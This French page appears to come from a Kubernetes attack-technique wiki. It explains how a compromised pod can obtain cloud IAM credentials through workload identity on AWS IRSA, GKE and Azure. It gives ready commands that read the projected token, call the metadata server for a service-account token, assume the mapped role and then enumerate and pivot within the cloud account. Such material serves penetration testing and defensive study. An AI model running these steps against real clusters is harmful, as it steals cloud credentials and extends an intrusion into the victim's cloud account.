---
title: "IAM cloud via workload identity : suivre l'identité d'un pod jusque dans le cloud"
order: 3
description: "Les fonctionnalités de workload identity (IRSA sur EKS, GKE Workload Identity, Azure AD workload identity) associent un compte de service Kubernetes à un rôle IAM cloud. Un pod utilisant un tel compte de service peut obtenir les identifiants du rôle cloud via l'échange de jeton projeté, de sorte que compromettre ce pod atteint le compte cloud au niveau de permission du rôle."
keywords:
  - workload identity
  - irsa
  - gke workload identity
  - cloud iam
  - lateral movement
---

# IAM cloud via workload identity

Les clusters managés lient les comptes de service Kubernetes à des rôles IAM cloud pour que les pods puissent appeler les API cloud sans clés statiques : AWS IRSA, GKE Workload Identity et Azure AD workload identity associent tous le compte de service d'un pod à un rôle cloud. Le pod reçoit un jeton projeté et lié à une audience qu'il échange contre des identifiants cloud. Pour un attaquant, compromettre un pod qui utilise un tel compte de service livre le rôle cloud associé, et ce rôle est souvent attaché à des ressources cloud réelles (stockage, bases de données, files de messages), de sorte que le mouvement transporte le point d'appui depuis le cluster vers le compte cloud.

Détecter l'association et échanger contre des identifiants cloud :

```bash
# AWS IRSA: the webhook injects these into the pod
env | grep -E 'AWS_ROLE_ARN|AWS_WEB_IDENTITY_TOKEN_FILE'
cat $AWS_WEB_IDENTITY_TOKEN_FILE                        # the projected OIDC token
aws sts assume-role-with-web-identity \
  --role-arn "$AWS_ROLE_ARN" --role-session-name x \
  --web-identity-token "$(cat $AWS_WEB_IDENTITY_TOKEN_FILE)"
# the AWS SDK/CLI does this automatically when those env vars are present:
aws sts get-caller-identity

# GKE Workload Identity: reach the GKE metadata server for a token
curl -s -H 'Metadata-Flavor: Google' \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
curl -s -H 'Metadata-Flavor: Google' \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

# Azure workload identity: exchange the projected token for an AAD token
env | grep -E 'AZURE_CLIENT_ID|AZURE_FEDERATED_TOKEN_FILE|AZURE_TENANT_ID'
```

## Utiliser le rôle cloud

```bash
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws s3 ls; aws sts get-caller-identity                  # scope = the mapped role
# enumerate what the role can do, then reach the resources it permits
```

## Notes d'exploitation

- Le rôle associé au pod est distinct du rôle du nœud : la workload identity est l'identité cloud propre au pod, tandis que [Métadonnées cloud depuis un pod](../cluster-enumeration/cloud-metadata-from-pod.md) est celle du nœud. Vérifiez les deux ; le plus riche l'emporte.
- Sur AWS, les `AWS_ROLE_ARN` et le fichier de jeton injectés sont le signe révélateur ; le SDK effectue l'échange automatiquement, de sorte que simplement exécuter `aws` depuis le pod agit en tant que rôle.
- GKE Workload Identity passe par le serveur de métadonnées mais renvoie le jeton du compte de service Google associé, et non celui du nœud ; vérifiez l'endpoint `email` pour voir quelle identité vous obtenez.
- Les rôles associés sont fréquemment sur-dimensionnés ; énumérez-les avec la simulation IAM du fournisseur cloud ou en sondant les lectures de ressources, puis pivotez au sein du compte cloud.

## Références

- [AWS : rôles IAM pour les comptes de service (IRSA)](https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html)
- [GKE : Workload Identity](https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity)
- [Azure : workload identity](https://azure.github.io/azure-workload-identity/docs/)
